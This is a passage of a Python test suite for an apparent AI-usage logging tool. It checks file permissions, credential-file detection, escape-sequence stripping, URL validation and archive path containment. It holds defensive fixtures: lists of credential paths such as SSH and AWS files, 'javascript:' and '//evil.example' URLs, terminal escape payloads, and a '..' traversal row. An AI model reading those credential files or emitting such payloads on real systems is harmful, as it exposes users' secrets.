        modes["archive-dir"] = os.stat(os.path.join(home, "archive")).st_mode & 0o777
        modes["index"] = os.stat(os.path.join(home, "archive", "index.sqlite")).st_mode & 0o777
        an = anonymize.Anonymizer("salt", os.path.join(home, "map.json"))
        an.host("x")
        an.save_map()
        modes["map"] = os.stat(os.path.join(home, "map.json")).st_mode & 0o777
        # a config someone else could edit is refused
        os.chmod(os.path.join(home, "config.json"), 0o666)
        r = run([PY, os.path.join(SCRIPTS, "ledger.py"), "status"], env=env)
        shared_refused = r.returncode != 0 and "writable" in (r.stderr + r.stdout)
        os.chmod(os.path.join(home, "config.json"), 0o600)
        want = {"home": 0o700, "config": 0o600, "accounts": 0o600, "manifest": 0o600, "sqlite": 0o600, "json-dir": 0o700, "prefs": 0o600, "archive-dir": 0o700, "index": 0o600, "map": 0o600}
        bad = {k: oct(v) for k, v in modes.items() if v != want[k]}
        good = not bad and shared_refused
        print("perms:     %s under umask 022; shared config refused %s  %s" % ("all private" if not bad else "wrong: %s" % bad, shared_refused, "OK" if good else "FAIL"))
        shutil.rmtree(home, ignore_errors=True)
        return good
    finally:
        os.umask(old)


def _raises(fn):
    try:
        fn()
        return False
    except SystemExit:
        return True


def check_shared_predicates():
    """safety.is_credential_file / clean_for_terminal / validate_study_url / check_generic_root."""
    cred_yes = ["/home/u/.codex/auth.json", "C:\\Users\\u\\.claude\\.credentials.json", "/srv/app/credentials.json", "/x/token.json", "/x/api_key.txt",
                "/x/server.pem", "/x/private.key", "/home/u/.env", "/home/u/.env.local", "/home/u/.ssh/config", "/home/u/.aws/credentials", "/x/my-secret-notes.md", "/x/id_rsa.pub"]
    cred_no = ["/home/u/.codex/sessions/2026/09/01/rollout-x.jsonl", "/home/u/.claude/projects/p/s.jsonl", "/x/usage.csv", "/x/events.jsonl", "/home/u/.local/share/opencode/opencode.db"]
    c1 = all(safety.is_credential_file(x) for x in cred_yes)
    c2 = not any(safety.is_credential_file(x) for x in cred_no)
    cleaned = safety.clean_for_terminal("ok\x1b[31mred\x1b[0m\x07bell\x9bZ\ttab\nline")
    c3 = "\x1b" not in cleaned and "\x07" not in cleaned and "\x9b" not in cleaned and "\ttab\nline" in cleaned and cleaned.startswith("okred")
    c4 = len(safety.clean_for_terminal("x" * 10000, limit=100)) < 200
    urls_bad = ["javascript:alert(1)", "data:text/html,x", "//evil.example/x", "http://example.com/x", " https://ok.example/x", "https://ok.example/x\n", "vbscript:x", "https:///nohost"]
    u1 = all(_raises(lambda v=v: safety.validate_study_url(v)) for v in urls_bad)
    u2 = safety.validate_study_url("https://claude.ai/code/artifact/abc") == "https://claude.ai/code/artifact/abc" and safety.validate_study_url("") == ""
    home = os.path.expanduser("~")
    roots_bad = [home, "C:\\", "/", os.path.join(home, "AppData", "Roaming"), os.path.join(home, ".config"), os.path.join(home, "Documents"), "/home", os.path.join(home, ".local", "share")]
    g1 = all(_raises(lambda r=r: safety.check_generic_root(r)) for r in roots_bad)
    g2 = all(not _raises(lambda r=r: safety.check_generic_root(r)) for r in (os.path.join(home, ".config", "manicode"), os.path.join(home, ".factory", "sessions"), "/srv/openclaw/config", os.path.join(home, "AppData", "Local", "hermes")))
    good = c1 and c2 and c3 and c4 and u1 and u2 and g1 and g2
    print("predicates: credential files %s/%s, terminal cleaning %s, study_url %s/%s, generic root %s/%s  %s" % (c1, c2, c3 and c4, u1, u2, g1, g2, "OK" if good else "FAIL"))
    return good


def check_followups_1_5_9():
    """Codex on #25: purge keeps rows whose file could not be removed and works in either storage mode; status
    reports the post-purge archive; a legacy config's implicit WSL default is withdrawn; archive dirs are dedicated."""
    import tempfile
    import ledger_archive
    base = tempfile.mkdtemp(prefix="ledger-fu-")
    # archive created compressed, then opened uncompressed: the legacy credential row must still be purged correctly
    ar = ledger_archive.Archive(os.path.join(base, "arch"), compress=True)
    os.makedirs(os.path.join(ar.path, "h1", "home", "u", ".codex"), exist_ok=True)
    open(os.path.join(ar.path, "h1", "home", "u", ".codex", "auth.json.gz"), "wb").write(b"x")
    ar.db.execute("INSERT INTO files (host, path, rel, size, mtime, sha256, archived_at) VALUES ('h1','/home/u/.codex/auth.json','home/u/.codex/auth.json',1,0,'s','t')")
    ar.db.commit()
    ar.close()
    ar2 = ledger_archive.Archive(os.path.join(base, "arch"), compress=False)
    hidden = not any(f["path"].endswith("auth.json") for f in ar2.list("h1"))
    purged, unrem = ar2.purge_credential_rows()
    gone = purged == 1 and unrem == 0 and not os.path.exists(os.path.join(ar2.path, "h1", "home", "u", ".codex", "auth.json.gz")) and ar2.db.execute("SELECT COUNT(*) FROM files").fetchone()[0] == 0
    ar2.close()
    # status output describes the post-purge archive
    r = run([PY, os.path.join(SCRIPTS, "ledger_archive.py"), "--archive", os.path.join(base, "arch"), "status"])
    st = json.loads(r.stdout) if r.returncode == 0 else {}
    status_ok = r.returncode == 0 and "credential_rows_purged" in st and sum(h["files"] for h in st.get("hosts", [])) == 0
    # a non-empty, unrelated directory is refused as an archive root; a fresh one gets the marker
    other = os.path.join(base, "documents")
    os.makedirs(other)
    open(os.path.join(other, "thesis.docx"), "w").write("x")
    refused = _raises(lambda: ledger_archive.Archive(other))
    fresh = ledger_archive.Archive(os.path.join(base, "fresh"))
    marker = os.path.isfile(os.path.join(fresh.path, ".ai-usage-ledger-archive"))
    fresh.close()
    # legacy config: implicit wsl=True is withdrawn; an explicit choice survives
    home = os.path.join(base, "home")
    env = dict(os.environ, AI_USAGE_LEDGER_HOME=home)
    run([PY, os.path.join(SCRIPTS, "ledger.py"), "init", "--yes", "--set", "detect.all_profiles=n"], env=env)
    cfgp = os.path.join(home, "config.json")
    c = json.load(open(cfgp, encoding="utf-8"))
    c["version"] = 1
    c["detect"] = {"all_profiles": False, "wsl": True, "on_every_run": True}
    json.dump(c, open(cfgp, "w", encoding="utf-8"))
    s1 = run([PY, os.path.join(SCRIPTS, "ledger.py"), "status"], env=env)
    c1 = json.load(open(cfgp, encoding="utf-8"))  # the withdrawal is persisted as soon as the config is loaded
    migrated = "migrated" in s1.stderr and c1["detect"]["wsl"] is False and c1.get("version") == 3  # persisted on load
    r2 = run([PY, os.path.join(SCRIPTS, "ledger.py"), "init", "--yes"], env=env)
    c2 = json.load(open(cfgp, encoding="utf-8"))
    withdrawn = r2.returncode == 0 and c2["detect"]["wsl"] is False and c2.get("version") == 3
    c2["version"] = 1
    c2["detect"] = {"all_profiles": False, "wsl": True, "on_every_run": True, "explicit": True}
    json.dump(c2, open(cfgp, "w", encoding="utf-8"))
    run([PY, os.path.join(SCRIPTS, "ledger.py"), "init", "--yes"], env=env)
    c3 = json.load(open(cfgp, encoding="utf-8"))
    kept = c3["detect"]["wsl"] is True
    # an unmarked directory with a foreign index.sqlite or extra files is refused; a real legacy archive is accepted
    foreign = os.path.join(base, "foreign")
    os.makedirs(foreign)
    import sqlite3 as _sq
    _sq.connect(os.path.join(foreign, "index.sqlite")).execute("CREATE TABLE t (x)").connection.close()
    open(os.path.join(foreign, "photos.zip"), "w").write("x")
    foreign_refused = _raises(lambda: ledger_archive.Archive(foreign))
    legacy = ledger_archive.Archive(os.path.join(base, "legacy"))
    legacy.close()
    os.remove(os.path.join(base, "legacy", ".ai-usage-ledger-archive"))
    legacy_ok = not _raises(lambda: ledger_archive.Archive(os.path.join(base, "legacy")).close())
    # a legacy row whose host escapes the root is kept as unremovable and nothing outside is touched
    outside = os.path.join(base, "victim-secret.key")
    open(outside, "w").write("x")
    a3 = ledger_archive.Archive(os.path.join(base, "arch3"))
    a3.db.execute("INSERT INTO files (host, path, rel, size, mtime, sha256, archived_at) VALUES (?,?,?,?,?,?,?)", ("..", "/victim-secret.key", "victim-secret.key", 1, 0, "s", "t"))
    a3.db.commit()
    p3, u3 = a3.purge_credential_rows()
    a3.close()
    contained_ok = p3 == 0 and u3 == 1 and os.path.isfile(outside)
    # migration prunes WSL hosts from the manifest and sets a schedule consent aside
    m = json.load(open(os.path.join(home, "manifest.json"), encoding="utf-8"))
    m["hosts"].append({"name": "wsl-ubuntu", "kind": "wsl", "distro": "Ubuntu", "codex_roots": ["/home/u/.codex"]})
    json.dump(m, open(os.path.join(home, "manifest.json"), "w", encoding="utf-8"))
    open(os.path.join(home, "schedule-consent.json"), "w").write("{}")
    c4 = json.load(open(cfgp, encoding="utf-8"))
    c4["version"] = 1
    c4["detect"] = {"all_profiles": False, "wsl": True, "on_every_run": True}
    json.dump(c4, open(cfgp, "w", encoding="utf-8"))
    s4 = run([PY, os.path.join(SCRIPTS, "ledger.py"), "status"], env=env)
    m4 = json.load(open(os.path.join(home, "manifest.json"), encoding="utf-8"))
    pruned = s4.returncode == 0 and not any(h.get("kind") == "wsl" for h in m4["hosts"]) and not os.path.exists(os.path.join(home, "schedule-consent.json")) and os.path.exists(os.path.join(home, "schedule-consent.json.withdrawn")) and json.load(open(cfgp, encoding="utf-8")).get("version") == 3
    # a home already saved at version 2 (by 1.5.9) with WSL off but WSL hosts still in its manifest is reconciled
    m5 = json.load(open(os.path.join(home, "manifest.json"), encoding="utf-8"))
    m5["hosts"].append({"name": "wsl-ubuntu", "kind": "wsl", "distro": "Ubuntu", "codex_roots": ["/home/u/.codex"]})
    json.dump(m5, open(os.path.join(home, "manifest.json"), "w", encoding="utf-8"))
    open(os.path.join(home, "schedule-consent.json"), "w").write("{}")
    c5 = json.load(open(cfgp, encoding="utf-8"))
    c5["version"] = 2
    c5["detect"] = {"all_profiles": False, "wsl": False, "on_every_run": True}
    json.dump(c5, open(cfgp, "w", encoding="utf-8"))
    run([PY, os.path.join(SCRIPTS, "ledger.py"), "status"], env=env)
    m5b = json.load(open(os.path.join(home, "manifest.json"), encoding="utf-8"))
    reconciled = not any(h.get("kind") == "wsl" for h in m5b["hosts"]) and os.path.exists(os.path.join(home, "schedule-consent.json.withdrawn")) and json.load(open(cfgp, encoding="utf-8")).get("version") == 3
    # when the manifest holds no WSL host, a migration leaves the consent alone
    for f in os.listdir(home):
        if f.startswith("schedule-consent.json"):
            os.remove(os.path.join(home, f))
    open(os.path.join(home, "schedule-consent.json"), "w").write("{}")
    c6 = json.load(open(cfgp, encoding="utf-8"))
    c6["version"] = 1
    c6["detect"] = {"all_profiles": False, "wsl": True, "on_every_run": True}
    json.dump(c6, open(cfgp, "w", encoding="utf-8"))
    run([PY, os.path.join(SCRIPTS, "ledger.py"), "status"], env=env)
    consent_kept = os.path.exists(os.path.join(home, "schedule-consent.json")) and not os.path.exists(os.path.join(home, "schedule-consent.json.withdrawn"))
    # an index with our table names but an incomplete schema is not accepted as a legacy archive
    partial = os.path.join(base, "partial")
    os.makedirs(partial)
    dbp = _sq.connect(os.path.join(partial, "index.sqlite"))
    dbp.execute("CREATE TABLE files (host, path, rel, size, mtime, sha256, archived_at)")
    dbp.execute("CREATE TABLE runs (x)")
    dbp.commit()
    dbp.close()
    partial_refused = not ledger_archive.Archive._is_legacy_archive(partial)
    # a `runs` view exposing our columns is not our index either
    viewd = os.path.join(base, "viewd")
    os.makedirs(viewd)
    dbv = _sq.connect(os.path.join(viewd, "index.sqlite"))
    dbv.execute("CREATE TABLE files (host TEXT, path TEXT, rel TEXT, size INTEGER, mtime REAL, sha256 TEXT, archived_at TEXT, versions INTEGER DEFAULT 1, PRIMARY KEY (host, path))")
    dbv.execute("CREATE TABLE runs_ (id INTEGER PRIMARY KEY AUTOINCREMENT, host TEXT, started_at TEXT, finished_at TEXT, files_new INTEGER, files_updated INTEGER, bytes INTEGER, note TEXT)")
    dbv.execute("CREATE VIEW runs AS SELECT * FROM runs_")
    dbv.commit()
    dbv.close()
    view_refused = not ledger_archive.Archive._is_legacy_archive(viewd)
    # a reconciliation that could not inspect the manifest is retried on the next load
    mpath = os.path.join(home, "manifest.json")
    good_manifest = open(mpath, encoding="utf-8").read()
    mj = json.loads(good_manifest)
    mj["hosts"].append({"name": "wsl-ubuntu", "kind": "wsl", "distro": "Ubuntu", "codex_roots": ["/home/u/.codex"]})
    open(mpath, "w", encoding="utf-8").write("{not json" + json.dumps(mj))
    c7 = json.load(open(cfgp, encoding="utf-8"))
    c7["version"] = 2
    c7["detect"] = {"all_profiles": False, "wsl": False, "on_every_run": True}
    json.dump(c7, open(cfgp, "w", encoding="utf-8"))
    run([PY, os.path.join(SCRIPTS, "ledger.py"), "status"], env=env)
    retry_pending = json.load(open(cfgp, encoding="utf-8")).get("version") == 2
    os.remove(mpath)  # an absent configured manifest is not reconciled either
    run([PY, os.path.join(SCRIPTS, "ledger.py"), "status"], env=env)
    retry_pending = retry_pending and json.load(open(cfgp, encoding="utf-8")).get("version") == 2
    json.dump(mj, open(mpath, "w", encoding="utf-8"))  # repaired: the next load prunes the WSL host
    run([PY, os.path.join(SCRIPTS, "ledger.py"), "status"], env=env)
    m7 = json.load(open(mpath, encoding="utf-8"))
    retried = retry_pending and json.load(open(cfgp, encoding="utf-8")).get("version") == 3 and not any(h.get("kind") == "wsl" for h in m7["hosts"])
    # an invalid archive path stops onboarding before accounts.json is rewritten
    acc_before = open(os.path.join(home, "accounts.json"), encoding="utf-8").read()
    r5 = run([PY, os.path.join(SCRIPTS, "ledger.py"), "init", "--yes", "--set", "archive.raw_logs=y", "--set", "archive.path=" + foreign, "--set", "accounts.from_credentials=y"], env=env)
    early = r5.returncode != 0 and "already holds other files" in (r5.stderr + r5.stdout) and open(os.path.join(home, "accounts.json"), encoding="utf-8").read() == acc_before
    good = hidden and gone and status_ok and refused and marker and migrated and withdrawn and kept and foreign_refused and legacy_ok and contained_ok and pruned and early and reconciled and consent_kept and partial_refused and view_refused and retried
    print("followups: legacy row hidden %s / purged in other mode %s, status post-purge %s, unrelated dir refused %s / marker %s, legacy wsl withdrawn %s (explicit kept %s), foreign index refused %s / legacy accepted %s, escape row kept %s, manifest pruned + consent withdrawn %s, archive path checked first %s, v2 home reconciled %s, consent kept without WSL hosts %s, partial schema refused %s, view refused %s, failed reconcile retried %s  %s" % (
        hidden, gone, status_ok, refused, marker, withdrawn, kept, foreign_refused, legacy_ok, contained_ok, pruned, early, reconciled, consent_kept, partial_refused, view_refused, retried, "OK" if good else "FAIL"))
    if not good:
        print(r.stdout[-300:], r.stderr[-300:], s1.stderr[-200:], r2.stderr[-200:])
    shutil.rmtree(base, ignore_errors=True)
    return good


def check_examples_self_contained():
    bad = []
    for fn in ("example.html", "example-study.html"):
        p = os.path.join(ROOT, "assets", "examples", fn)
        if not os.path.isfile(p):
            continue
        h = open(p, encoding="utf-8").read()
        if EXTERNAL_REF.search(h) or "fonts.googleapis" in h or "Content-Security-Policy" not in h:
            bad.append(fn)
    good = not bad
    print("examples:  committed pages self-contained with CSP  %s%s" % ("OK" if good else "FAIL", "" if good else " " + ", ".join(bad)))
    return good


def check_generic_root_guard():
    """The generic sniffer refuses a home / AppData / .config root before opening anything, and never opens a
    credential-looking file below an accepted root (counted in the inventory)."""
    scanner = os.path.join(SCRIPTS, "compile_ai_logs.py")
    home = os.path.expanduser("~")
    broad = [home, os.path.join(home, "AppData", "Roaming") if os.name == "nt" else os.path.join(home, ".config"), os.path.join(home, "Documents")]
    refused = 0
    for i, root in enumerate(broad):
        out_dir = os.path.join(OUT, "generic-refused-%d" % i)
        r = run([PY, scanner, "scan", "--host", "g", "--out-dir", out_dir, "--generic-root", "tool=" + root])
        if r.returncode != 0 and "generic root" in (r.stderr + r.stdout) and not os.path.exists(out_dir):
            refused += 1
    # an accepted root with one usage file and three credential-looking files carrying the same usage shape
    root = os.path.join(OUT, "generic-root", "demo-tool")
    os.makedirs(root, exist_ok=True)
    usage = {"messages": [{"role": "assistant", "timestamp": "2026-09-01T10:00:00Z", "model": "m", "usage": {"input_tokens": 10, "output_tokens": 5}}]}
    for fn in ("chat.json", "auth.json", "api_token.json", ".env.json"):
        json.dump(usage, open(os.path.join(root, fn), "w", encoding="utf-8"))
    out_dir = os.path.join(OUT, "generic-accepted")
    r = run([PY, scanner, "scan", "--host", "g", "--out-dir", out_dir, "--no-prompts", "--generic-root", "demo=" + root])
    ev_path = os.path.join(out_dir, "events.g.jsonl")
    events = [json.loads(ln) for ln in open(ev_path, encoding="utf-8")] if os.path.isfile(ev_path) else []
    srcs = {os.path.basename(e.get("src") or "") for e in events}
    inv = json.load(open(os.path.join(out_dir, "inventory.g.json"), encoding="utf-8")) if os.path.isfile(os.path.join(out_dir, "inventory.g.json")) else {"roots": []}
    row = (inv["roots"] or [{}])[0]
    skipped_ok = r.returncode == 0 and srcs == {"chat.json"} and len(events) == 1 and row.get("credential_files_skipped") == 3 and "3 credential-like files skipped" in (row.get("note") or "")
    no_prompts_file = not os.path.exists(os.path.join(out_dir, "prompts.g.jsonl")) and inv.get("prompts_captured") is False
    good = refused == len(broad) and skipped_ok and no_prompts_file
    print("generic:   %d/%d broad roots refused before any output, credential files skipped %s (events from %s, skipped %s), --no-prompts writes no prompts file %s  %s" % (
        refused, len(broad), skipped_ok, sorted(srcs), row.get("credential_files_skipped"), no_prompts_file, "OK" if good else "FAIL"))
    if not good:
        print(r.stderr[-400:])
    return good


def check_private_run_files():
    """POSIX: manifest.run.json and the anonymised tree's config files and exports are created 0600 (they name hosts,
    roots and accounts, and the pseudonyms map back through anonymize-map.json)."""
    if os.name == "nt":
        print("run-files: skipped on Windows (NTFS profile ACLs; POSIX modes are checked in CI)  OK")
        return True
    import tempfile
    old = os.umask(0o022)
    try:
        home = tempfile.mkdtemp(prefix="ledger-runfiles-")
        env = dict(os.environ, AI_USAGE_LEDGER_HOME=home)
        ledger = os.path.join(SCRIPTS, "ledger.py")
        run([PY, ledger, "init", "--yes", "--set", "detect.wsl=n", "--set", "detect.all_profiles=n", "--set", "workdir=" + os.path.join(home, "work")], env=env)
        cfg = json.load(open(os.path.join(home, "config.json"), encoding="utf-8"))
        m = json.load(open(cfg["manifest_path"], encoding="utf-8"))
        m["hosts"] = [{"name": "fixture", "kind": "local", "claude_roots": [os.path.join(FX, "claude")], "codex_roots": [os.path.join(FX, "codex")], "aider_roots": [os.path.join(FX, "aider")]}]
        json.dump(m, open(cfg["manifest_path"], "w", encoding="utf-8"), indent=2)
        shutil.copy(os.path.join(ROOT, "examples", "accounts.fixtures.json"), cfg["accounts_path"])
        r1 = run([PY, ledger, "run", "--no-detect", "--skip-tools", "aider"], env=env)
        r2 = run([PY, ledger, "run", "--no-detect", "--no-scan", "--anonymize"], env=env)
        anon = os.path.join(cfg["workdir"], "anonymized")
        files = {"manifest.run": os.path.join(home, "manifest.run.json"), "anon-accounts": os.path.join(anon, "accounts.json"), "anon-pricing": os.path.join(anon, "pricing.json"),
                 "anon-report_config": os.path.join(anon, "report_config.json"), "anon-manifest": os.path.join(anon, "manifest.json"),
                 "anon-events": os.path.join(anon, "store-export", "events.anon.jsonl"), "anon-sessions": os.path.join(anon, "store-export", "sessions.anon.jsonl")}
        modes = {k: (os.stat(p).st_mode & 0o777 if os.path.isfile(p) else None) for k, p in files.items()}
        bad = {k: (oct(v) if v is not None else "missing") for k, v in modes.items() if v != 0o600}
        good = r1.returncode == 0 and r2.returncode == 0 and not bad
        print("run-files: %s under umask 022  %s" % ("manifest.run.json and the anonymised tree's config files and exports are 0600" if not bad else "wrong: %s" % bad, "OK" if good else "FAIL"))
        if not good:
            print(r1.stderr[-400:], r2.stderr[-400:])
        shutil.rmtree(home, ignore_errors=True)
        return good
    finally:
        os.umask(old)
def check_output_permissions():
    """Audit T09 (1.5.12): scan, compiled, report, package, dashboard and archive outputs are created owner-only
    (0700 dirs, 0600 files) even under a permissive umask, and a stale permissive file is repaired."""
    if os.name == "nt":
        print("outputs:   skipped on Windows (NTFS profile ACLs; POSIX modes are checked in CI)  OK")
        return True
    import tempfile
    old = os.umask(0o022)
    try:
        work = tempfile.mkdtemp(prefix="ledger-outputs-")
        # --- direct scanner run, prompts ON, into a dir whose stale files are group/world readable
        scan = os.path.join(work, "direct", "scans", "fixture")
        os.makedirs(scan, exist_ok=True)
        os.chmod(os.path.join(work, "direct"), 0o755)
        os.chmod(os.path.join(work, "direct", "scans"), 0o755)
        os.chmod(scan, 0o755)
        for stale in ("events.fixture.jsonl", "inventory.fixture.json"):
            p = os.path.join(scan, stale)
            with open(p, "w", encoding="utf-8") as fh:
                fh.write("")
            os.chmod(p, 0o644)
        compiled = os.path.join(work, "direct", "compiled")
        r1 = run([PY, os.path.join(SCRIPTS, "compile_ai_logs.py"), "scan", "--host", "fixture", "--out-dir", scan,
                  "--claude-root", os.path.join(FX, "claude"), "--codex-root", os.path.join(FX, "codex")])
        r2 = run([PY, os.path.join(SCRIPTS, "compile_ai_logs.py"), "report", "--events", os.path.join(scan, "events.fixture.jsonl"),
                  "--sessions", os.path.join(scan, "sessions.fixture.jsonl"), "--prompts", os.path.join(scan, "prompts.fixture.jsonl"),
                  "--inventory", os.path.join(scan, "inventory.fixture.json"), "--pricing", os.path.join(ROOT, "templates", "pricing.json"), "--out-dir", compiled])
        # --- full pipeline into a second temp workdir: dashboard, package and archive of the run
        pipe = os.path.join(work, "pipe")
        os.makedirs(pipe, exist_ok=True)
        manifest = os.path.join(pipe, "manifest.json")
        with open(manifest, "w", encoding="utf-8") as fh:
            json.dump({"workdir": ".", "timezone": "UTC", "snapshot_date": "2026-01-02", "package_prefix": "Perm_Ledger",
                       "pricing": os.path.join(ROOT, "templates", "pricing.json"),
                       "hosts": [{"name": "fixture", "kind": "local", "claude_roots": [os.path.join(FX, "claude")], "codex_roots": [os.path.join(FX, "codex")]}]}, fh)
        r3 = run([PY, os.path.join(SCRIPTS, "run_pipeline.py"), "--manifest", manifest])
        pkg = os.path.join(pipe, "reports", "Perm_Ledger_2026-01-02")
        dirs = {"scan-dir": (scan, 0o700), "compiled": (compiled, 0o700),
                "pipe-work": (pipe, 0o700), "pipe-scans": (os.path.join(pipe, "scans"), 0o700), "pipe-compiled": (os.path.join(pipe, "compiled"), 0o700),
                "reports": (os.path.join(pipe, "reports"), 0o700), "package": (pkg, 0o700)}
        files = {"events": (os.path.join(scan, "events.fixture.jsonl"), 0o600), "prompts": (os.path.join(scan, "prompts.fixture.jsonl"), 0o600),
                 "sessions": (os.path.join(scan, "sessions.fixture.jsonl"), 0o600), "inventory": (os.path.join(scan, "inventory.fixture.json"), 0o600),
                 "all_events": (os.path.join(compiled, "all_events.csv"), 0o600), "summary.json": (os.path.join(compiled, "summary.json"), 0o600),
                 "SUMMARY.md": (os.path.join(compiled, "SUMMARY.md"), 0o600), "by_tool": (os.path.join(compiled, "by_tool.csv"), 0o600),
                 "all_prompts": (os.path.join(compiled, "all_prompts.jsonl"), 0o600),
                 "analysis.json": (os.path.join(pipe, "compiled", "analysis.json"), 0o600),
                 "dashboard": (os.path.join(pipe, "compiled", "agent-ledger.html"), 0o600),
                 "USAGE_REPORT.md": (os.path.join(pkg, "USAGE_REPORT.md"), 0o600), "report.html": (os.path.join(pkg, "report.html"), 0o600),
                 "ledger.json": (os.path.join(pkg, "ledger.json"), 0o600), "pricing.json": (os.path.join(pkg, "pricing.json"), 0o600),
                 "README.md": (os.path.join(pkg, "README.md"), 0o600), "SENSITIVITY.md": (os.path.join(pkg, "SENSITIVITY.md"), 0o600),
                 "SHA256SUMS": (os.path.join(pkg, "SHA256SUMS"), 0o600), "package.zip": (pkg + ".zip", 0o600)}
        bad = {k: "missing" for k, (p, _) in {**dirs, **files}.items() if not os.path.exists(p)}
        for k, (p, want) in {**dirs, **files}.items():
            if os.path.exists(p):
                have = os.stat(p).st_mode & 0o777
                if have != want:
                    bad[k] = "%s != %s" % (oct(have), oct(want))
        # remote staging must be private and removed after retrieval, whatever the outcome
        src = open(os.path.join(SCRIPTS, "run_pipeline.py"), encoding="utf-8").read()
        remote_ok = "install -d -m 700" in src and "rm -rf -- " in src and "finally:" in src
        good = r1.returncode == 0 and r2.returncode == 0 and r3.returncode == 0 and not bad and remote_ok
        print("outputs:   %s; remote staging private+cleaned %s under umask 022  %s" % (
            "all owner-only (0700/0600)" if not bad else "wrong: %s" % bad, remote_ok, "OK" if good else "FAIL"))
        if not good:
            print((r3.stderr or "")[-500:])
        shutil.rmtree(work, ignore_errors=True)
        return good
    finally:
        os.umask(old)


def check_terminal_cleaning():
    """Issue #19: subprocess output and data text reach the terminal without escape sequences or C0 controls
    (schedule._run / status, run_pipeline.run / log, ledger_archive ssh log lines, ledger_query table, publish-check)."""
    import contextlib
    import io
    import tempfile
    import types
    import ledger_archive
    import ledger_query
    import run_pipeline
    hostile = "\x1b[31mred\x1b[0m\x07bell\x1b]0;title\x07\x9bZ"
    # schedule._run: a failing command whose stderr carries ESC / BEL
    out, err = io.StringIO(), io.StringIO()
    with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
        rc, _ = schedule._run([PY, "-c", "import sys; sys.stderr.write('\\x1b[31mred\\x1b[0m\\x07bell\\x9bZ'); sys.exit(1)"])
    text = out.getvalue() + err.getvalue()
    s1 = rc == 1 and "red" in text and "bell" in text and "\x1b" not in text and "\x07" not in text and "\x9b" not in text
    # schedule.status, both backends, with faked scheduler output and a run log that carry escape sequences
    home = tempfile.mkdtemp(prefix="ledger-term-")
    os.makedirs(os.path.join(home, "logs"))
    with open(os.path.join(home, "logs", "run.log"), "w", encoding="utf-8") as fh:
        fh.write("[t] scheduled run\n" + hostile + " done\n")
    real_is_win, real_run, real_cron = schedule.IS_WIN, schedule.subprocess.run, schedule.crontab_lines
    try:
        schedule.IS_WIN = True
        schedule.subprocess.run = lambda *a, **k: types.SimpleNamespace(returncode=0, stdout="Task To Run: " + hostile + " x.cmd\nStatus: Ready" + hostile + "\n", stderr="")
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            rc_w = schedule.status(home)
        win_text = out.getvalue()
        schedule.IS_WIN = False
        schedule.crontab_lines = lambda: ["0 3 * * * /x/run-ledger.sh " + schedule.MARK + hostile]
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            rc_p = schedule.status(home)
        posix_text = out.getvalue()
    finally:
        schedule.IS_WIN, schedule.subprocess.run, schedule.crontab_lines = real_is_win, real_run, real_cron
    s2 = rc_w == 0 and "Task To Run" in win_text and "Status" in win_text and "\x1b" not in win_text and "\x07" not in win_text and "\x9b" not in win_text
    s3 = rc_p == 0 and "run-ledger.sh" in posix_text and "last log lines" in posix_text and "done" in posix_text and "\x1b" not in posix_text and "\x07" not in posix_text
    # run_pipeline.run: the failure message and log() carry no escape sequences
    err = io.StringIO()
    msg = ""
    with contextlib.redirect_stderr(err):
        try:
            run_pipeline.run([PY, "-c", "import sys; sys.stderr.write('\\x1b[31mboom\\x1b[0m\\x07'); sys.exit(2)"], capture_output=True, text=True)
        except SystemExit as ex:
            msg = str(ex)
        run_pipeline.log("remote said " + hostile)
    p1 = msg.startswith("command failed (2)") and "boom" in msg and "\x1b" not in msg and "\x07" not in msg
    p2 = "remote said red" in err.getvalue() and "\x1b" not in err.getvalue() and "\x07" not in err.getvalue()
    # ledger_archive.archive_ssh: remote stderr in a log line is cleaned; the transfer never starts
    import subprocess as sp
    arch = ledger_archive.Archive(os.path.join(OUT, "arch-term"))
    lines = []
    real_sp_run, real_popen = sp.run, sp.Popen

    def fake_run(*a, **k):
        return types.SimpleNamespace(returncode=5, stdout=b"", stderr=hostile.encode("utf-8") + b" permission denied")

    def no_popen(*a, **k):
        raise RuntimeError("tar must not start")
    sp.run, sp.Popen = fake_run, no_popen
    try:
        res = arch.archive_ssh("h", {"ssh": "user@host"}, ["/srv/x.jsonl"], log=lines.append)
    finally:
        sp.run, sp.Popen = real_sp_run, real_popen
    arch.close()
    a1 = res == (0, 0, 0) and any("ssh stat failed" in x and "permission denied" in x for x in lines) and not any("\x1b" in x or "\x07" in x or "\x9b" in x for x in lines)
    # ledger_query.emit table mode: text cells cleaned and flattened; json mode keeps the raw value
    out = io.StringIO()
    ledger_query.emit(["ts", "session", "cwd", "prompt", "total"], [("2026-09-01T00:00:00", "s" + hostile, "/home/u" + hostile, "line one\nline two\x1b[2J", 12345)], "table", out)
    tab = out.getvalue()
    q1 = "\x1b" not in tab and "\x07" not in tab and "\x9b" not in tab and "line one line two" in tab and "12,345" in tab and "(1 rows)" in tab
    out = io.StringIO()
    ledger_query.emit(["prompt"], [("a\x1b[1mb",)], "json", out)
    q2 = "\\u001b" in out.getvalue()
    # publish-check snippets: the checked file carries an escape sequence next to a credential path
    home2 = tempfile.mkdtemp(prefix="ledger-pc-")
    target = os.path.join(home2, "notes.txt")
    with open(target, "w", encoding="utf-8") as fh:
        fh.write("token read from /home/u/.codex/auth.json " + hostile + " end\n")
    r = run([PY, os.path.join(SCRIPTS, "ledger.py"), "publish-check", target], env=dict(os.environ, AI_USAGE_LEDGER_HOME=os.path.join(home2, "empty-home")))
    c1 = r.returncode == 1 and "auth.json" in r.stdout and "\x1b" not in r.stdout and "\x07" not in r.stdout and "\x9b" not in r.stdout
    good = s1 and s2 and s3 and p1 and p2 and a1 and q1 and q2 and c1
    print("terminal:  schedule._run %s, status win/posix %s/%s, run_pipeline run/log %s/%s, archive ssh log %s, query table/json %s/%s, publish-check %s  %s" % (
        s1, s2, s3, p1, p2, a1, q1, q2, c1, "OK" if good else "FAIL"))
    return good


def check_credential_exclusion():
    """Issue #20: one predicate (safety.is_credential_file) drops credential-like paths on the local path, the SSH
    path (no ssh process starts), in collect_sources, in the index itself and on restore."""
    import tempfile
    import ledger_archive
    names = ["auth.json", ".credentials.json", "credentials.json", "token.json", "x.pem", "x.key", ".env", os.path.join(".ssh", "config"), os.path.join(".aws", "credentials")]
    tmp = tempfile.mkdtemp(prefix="ledger-cred-arch-")
    paths = []
    for n in names:
        p = os.path.join(tmp, n)
        os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, "w", encoding="utf-8") as fh:
            fh.write('{"secret": "no"}\n')
        paths.append(p)
